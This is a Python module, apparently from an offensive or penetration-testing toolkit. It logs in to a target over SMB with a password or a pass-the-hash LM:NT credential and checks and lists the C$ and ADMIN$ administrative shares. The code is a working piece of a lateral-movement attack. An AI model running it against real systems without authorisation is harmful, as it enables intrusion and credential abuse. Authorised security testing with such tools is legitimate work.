"""
Lateral Movement Engine
"""

from typing import List, Dict, Any
from impacket.smbconnection import SMBConnection

class LateralMover:
    def __init__(self, target: str, username: str = None, password: str = None, 
                 domain: str = None, hashes: str = None, stealth: bool = False):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.hashes = hashes
        self.stealth = stealth
    
    def move(self) -> List[Dict[str, Any]]:
        """Attempt lateral movement"""
        print(f"  [*] Attempting lateral movement...")
        results = []
        
        if not self.username or not (self.password or self.hashes):
            print(f"  [!] Credentials required for lateral movement")
            return results
        
        # Try to access admin shares
        admin_shares = ['C$', 'ADMIN$']
        
        for share in admin_shares:
            try:
                smb = SMBConnection(self.target, self.target, timeout=10)
                
                if self.hashes:
                    # Parse LM:NT hash
                    lmhash, nthash = self.hashes.split(':')
                    smb.login(self.username, '', self.domain or '', 
                            lmhash=lmhash, nthash=nthash)
                else:
                    smb.login(self.username, self.password, self.domain or '')
                
                # Try to list the admin share
                smb.connectTree(share)
                files = smb.listPath(share, '\\*')
                
                if files:
                    results.append({
                        'share': share,
                        'accessible': True,
                        'files_count': len(files),
                        'method': 'SMB Admin Share',
                        'level': 'HIGH'
                    })
                    print(f"    [+] Admin share accessible: {share}")
                
                smb.logoff()
                
            except Exception as e:
                if "STATUS_ACCESS_DENIED" not in str(e) and "STATUS_LOGON_FAILURE" not in str(e):
                    print(f"    [!] Error accessing {share}: {e}")
        
        return results
